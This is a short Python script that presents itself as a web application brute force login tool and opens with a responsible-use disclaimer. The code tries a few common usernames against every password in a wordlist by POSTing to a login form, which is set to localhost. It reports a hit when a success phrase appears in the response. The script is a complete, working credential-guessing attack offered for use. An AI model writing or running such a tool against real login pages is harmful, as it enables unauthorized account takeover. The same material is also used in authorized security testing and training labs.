# ##########################################################################################
#
# Web Application Brute Force Login Tool
#
# ##########################################################################################
#
# Usage Guidelines:
#
# Responsible Use: Please use this script in a responsible and ethical manner. Unauthorized access to computer systems, networks, or devices is illegal and unethical.
# Authorized Access: Before using this script on any system that you do not own or administer, ensure you have obtained written authorization from the system owner or authorized personnel. Unauthorized access is a violation of privacy and may result in legal consequences.
# Educational Purposes: This script is intended for educational purposes to understand security vulnerabilities and should not be used maliciously.
# Legal Compliance: Comply with all applicable laws and regulations regarding computer security and data privacy in your jurisdiction.
# By using this script, you acknowledge and agree to abide by these guidelines and accept full responsibility for any consequences resulting from its use.
#
# ##########################################################################################

import requests
import sys

# Target Machine IP / Port
target = "http://127.0.0.1:5000"
# Usernames to use
usernames = ["admin", "user", "test"]
# Password List (i.e. Rockyou.txt)
passwords = "top-100.txt"
# Sucess Message (i.e. "Wecome back")
needle = "Welcome back"

for username in usernames:
	with open(passwords, "r") as passwords_list:
		for password in passwords_list:
			password =password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
			sys.stdout.flush()
			r = requests.post(target, data={"username": username, "password": password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password found for '{}'!".format(username))
		sys.stdout.write("\n")

